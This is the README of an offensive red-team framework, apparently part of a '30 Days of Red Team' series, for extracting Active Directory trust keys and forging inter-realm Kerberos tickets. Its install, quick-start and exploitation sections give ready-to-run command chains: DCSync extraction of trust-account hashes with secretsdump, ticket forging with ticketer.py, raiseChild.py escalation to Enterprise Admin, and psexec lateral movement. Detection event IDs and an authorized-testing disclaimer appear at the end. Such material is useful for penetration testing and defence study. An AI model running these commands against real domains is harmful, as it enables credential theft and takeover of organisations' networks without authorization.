# RT Trust Key Exploitation Framework

**Extract Trust Keys & Forge Inter-Realm Kerberos Tickets**

Part of the **30 Days of Red Team** toolkit by Maxwell Cross.

## Overview

A modular Python framework for extracting Active Directory trust keys and forging inter-realm Kerberos tickets for cross-domain attacks.

## Attack Theory

AD trusts share a secret key that allows Kerberos authentication across domain boundaries. By extracting this trust key, attackers can:

1. **Forge inter-realm TGTs** - Create tickets that allow access to trusted domains
2. **Bypass SID filtering** (if disabled) - Inject privileged SIDs for escalation
3. **Access cross-forest resources** - Move laterally between forests

## Features

- **Multiple Extraction Methods**: Mimikatz DCSync, Impacket secretsdump
- **Multiple Forging Methods**: Rubeus, Impacket ticketer.py
- **Trust Authentication Testing**: Verify cross-domain access
- **Exploitation Guides**: Detailed guides for each trust type
- **Cross-Platform**: Works from Linux with Impacket

## Installation

```bash
# Clone the toolkit
git clone https://github.com/maxwellcross-labs/30-days-redteam.git
cd 30-days-redteam/rt_trust_keys

# Install dependencies
pip install impacket ldap3
```

### Tool Dependencies

| Method | Tool Required | Platform |
|--------|---------------|----------|
| secretsdump | Impacket | Linux/Windows |
| Mimikatz | mimikatz.exe | Windows |
| Rubeus | Rubeus.exe | Windows |
| ticketer | Impacket | Linux/Windows |

## Quick Start

```bash
# Generate exploitation guide
python -m rt_trust_keys -s corp.local -t partner.local --action guide

# Extract trust key
python -m rt_trust_keys -s corp.local -t partner.local -u admin -p 'P@ssw0rd' \\
  --dc-ip 192.168.1.10 --action extract

# Test trust authentication
python -m rt_trust_keys -s corp.local -t partner.local -u admin -p 'P@ssw0rd' \\
  --action test

# Quick reference card
python -m rt_trust_keys -s corp.local -t partner.local --action quick-ref
```

## Project Structure

```
rt_trust_keys/
├── __init__.py              # Package initialization
├── __main__.py              # Module entry point
├── cli.py                   # Command-line interface
├── framework.py             # Main orchestrator
├── models/
│   ├── __init__.py
│   └── trust_key.py         # Data models
├── extractors/
│   ├── __init__.py
│   ├── base.py              # Base extractor class
│   ├── mimikatz.py          # Mimikatz DCSync
│   └── secretsdump.py       # Impacket secretsdump
├── forgers/
│   ├── __init__.py
│   ├── base.py              # Base forger class
│   ├── rubeus.py            # Rubeus ticket forging
│   └── impacket.py          # Impacket ticketer.py
├── testers/
│   ├── __init__.py
│   └── trust_tester.py      # Authentication testing
├── guides/
│   ├── __init__.py
│   └── exploitation_guide.py # Attack guides
└── utils/
    ├── __init__.py
    └── kerberos_utils.py    # Kerberos helpers
```

## Programmatic Usage

```python
from rt_trust_keys import TrustKeyFramework
from rt_trust_keys.models import TrustKey, KeyType

# Initialize
framework = TrustKeyFramework(output_dir="./results")

# Extract trust keys
keys = framework.extract_trust_key_secretsdump(
    source_domain="corp.local",
    target_domain="partner.local",
    username="admin",
    password="P@ssw0rd",
    dc_ip="192.168.1.10"
)

# Forge inter-realm TGT
if keys:
    ticket = framework.forge_inter_realm_tgt_impacket(
        trust_key=keys[0],
        user_to_impersonate="Administrator",
        user_sid="S-1-5-21-..."
    )

# Test authentication
framework.test_trust_authentication(
    "corp.local", "partner.local", "admin", "P@ssw0rd"
)

# Generate report
framework.generate_report()
```

## Trust Types & Exploitation

### Parent-Child Trust (Easiest)
```bash
# Automated with raiseChild.py
raiseChild.py child.corp.local/admin:'pass'@dc

# This automatically escalates to Enterprise Admin!
```

### Forest Trust (SID Filtering Usually Enabled)
```bash
# Extract trust key
secretsdump.py corp.local/admin:'pass'@dc -just-dc-user 'PARTNER$'

# Forge inter-realm TGT
ticketer.py -nthash TRUST_KEY -domain-sid SID -domain corp.local \\
  -spn krbtgt/partner.local administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass partner.local/administrator@dc.partner.local
```

### External Trust
Similar to forest trust - extract key and forge tickets.

## Key Types

| Type | Description | Preference |
|------|-------------|------------|
| AES256 | Strongest, stealthier | Best |
| AES128 | Strong | Good |
| RC4/NTLM | Legacy, most common | Default |

## MITRE ATT&CK Techniques

| Technique | ID |
|-----------|-----|
| Steal or Forge Kerberos Tickets | T1558 |
| OS Credential Dumping: DCSync | T1003.006 |
| Use Alternate Authentication Material | T1550.001 |

## Detection

- **Event ID 4662**: DCSync operation
- **Event ID 4675**: SIDs were filtered
- **Event ID 4769**: Kerberos service ticket request

## Legal Disclaimer

This tool is intended for authorized security testing only. Always obtain written permission before conducting penetration tests. Unauthorized access to computer systems is illegal.

## Author

**Maxwell Cross**  
30 Days of Red Team Series  
[Medium](https://medium.com/@maxwellcross) | [GitHub](https://github.com/maxwellcross-labs)